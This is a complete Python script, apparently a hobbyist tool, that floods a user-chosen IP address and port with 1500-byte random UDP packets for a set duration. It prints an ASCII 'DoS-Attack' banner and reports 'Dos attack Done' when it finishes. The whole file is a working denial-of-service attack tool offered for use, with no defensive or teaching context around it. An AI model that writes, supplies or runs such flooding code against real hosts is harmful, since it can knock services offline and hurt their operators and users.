## Libraries
import os
import sys
import time
import random
import socket
import colorama
from colorama import Fore
colorama.init(autoreset=True)
print(
'''
 ____                    _   _   _             _
|  _ \  ___  ___        / \ | |_| |_ __ _  ___| | __
| | | |/ _ \/ __|_____ / _ \| __| __/ _` |/ __| |/ /
| |_| | (_) \__ \_____/ ___ \ |_| || (_| | (__|   <
|____/ \___/|___/    /_/   \_\__|\__\__,_|\___|_|\_\

'''
)
sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
bytes = random._urandom(1500)
print("")
ip = input(f"{Fore.CYAN}[+] Enter target ip : ")
port = int(input("[+] Enter target port (defult 80) : "))
dur = int(input("[+] Enter time duration (1~100000) : "))
timeout = time.time() + dur
sent = 0
while True :
    try:
        if time.time() > timeout :
            break
        else:
            pass
        sock.sendto(bytes, (ip, port))
        sent = sent + 1
        print("sent",sent,"packets to",ip,"through port",port,)
    except KeyboardInterrupt:
        sys.exit()
print(f"""{Fore.RED}
    Dos attack Done:)
""")